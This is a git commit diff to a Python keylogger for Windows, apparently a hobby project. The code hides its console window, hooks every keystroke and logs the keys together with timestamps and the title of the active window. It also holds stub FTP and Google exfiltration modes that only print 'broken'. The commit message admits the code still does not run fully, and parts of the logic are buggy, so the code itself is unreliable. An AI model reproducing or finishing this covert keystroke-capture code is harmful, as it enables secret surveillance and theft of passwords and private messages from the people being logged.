8829f82b81323b74e7f569554a050599d60d0219
jack <wrexthor@protonmail.com>
2017-05-14 21:53:44 +0200

    Fixed most stuff, still doesnt run 100%

--- keylogger.py
+++ keylogger.py
@@ -1,4 +1,4 @@
-import pyHook, pythoncom, time, click, win32console,win32gui
+import pyHook, pythoncom, time, click, win32console, win32gui
 
 
 @click.command()
@@ -6,46 +6,73 @@ import pyHook, pythoncom, time, click, win32console,win32gui
                                                                    "defaults to c:\\temp\\logfile.txt")
 @click.option('--mode', '-m', default="local", help="Where to send log, defaults to local, options are local, ftp, ")
 
-#Hide Console
+
 def hide():
+    # hide Console
     window = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(window,0)
+    win32gui.ShowWindow(window, 0)
     return True
 
 def get_window():
+    # get title of foreground window and return it
+    return win32gui.GetWindowText(win32gui.GetForegroundWindow())
+    '''
     windowTile = "";
     while (True):
         newWindowTile = win32gui.GetWindowText(win32gui.GetForegroundWindow());
         if (newWindowTile != windowTile):
             windowTile = newWindowTile;
             print(windowTile);
+    '''
 
 
-def main(file):
-    hide()
-    x = time.ctime()
+def main():
+    hide
+    global data
     data = ''
+    return True
 
+def local():
+    global data, file
+    # check that there is at least 20 chars in data
+    if len(data) > 20:
+        # write data to file
+        with open(file, "a") as f:
+            # format output, adding information about which window is in focus at the time and timestamp
+            printing = "\n" + str(time.ctime()) + ' - ' + str(get_window()) + ' - ' + str(data)
+            f.write(printing)
+            # reset value of data
+            data = ''
+    return True
 
+def ftp():
+    print('FTP broken')
+    pass
 
-with open(file, "a") as f:
-    f.write("\n")
-    f.write("[" + x + "] : ")
+def google():
+    print('Google broken')
+    pass
+
+if __name__ == '__main__':
+    main()
 
 def on_keyboard_event(event):
-    global x, data
+    global mode, data
     if event.Key == "Return":
-        with open(file, "a") as f:
-            f.write(" {Enter}\n")
+        keys = "<Enter>"
     elif event.Key == "Space":
-        with open(file, "a") as f:
-            f.write(" ")
+        keys = "<Space>"
     elif event.Key == "Back":
-        with open(file, "a") as f:
-            f.write("{Bkspc}")
+        keys = "<Backspace>"
     else:
-        with open(file, "a") as f:
-            f.write(event.Key)
+        keys = event.Key
+    data = data + keys
+    if mode == 'local':
+        local()
+    elif mode == 'ftp':
+        ftp()
+    elif mode == 'google':
+        google()
     return True
 
 hooks_manager = pyHook.HookManager()
